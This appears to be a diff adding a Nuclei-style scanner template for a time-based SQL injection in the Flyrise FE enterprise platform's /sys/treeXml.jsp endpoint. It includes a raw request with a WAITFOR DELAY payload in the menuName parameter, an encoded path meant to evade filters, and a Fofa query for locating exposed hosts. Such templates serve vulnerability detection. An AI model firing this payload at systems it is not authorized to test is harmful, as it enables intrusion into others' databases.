@@ -1,0 +1,29 @@
+id: Flyrise_FE_treeXml_SQL_injected
+
+info:
+  name: Flyrise_FE_treeXml_SQL_injected
+  author: HK
+  severity: high
+  description: 飞企互联-FE企业运营管理平台/sys/treeXml.jsp接口存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="/login/indexPicXml_valid.jsp?p="
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /sys/treeXml.js%70?menuName=1';WAITFOR+DELAY+'0:0:4'--&type=function HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Language: zh-CN,zh;q=0.9
+    accept: */*
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+    Accept-Encoding: gzip, deflate
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+        - 'duration >= 4'
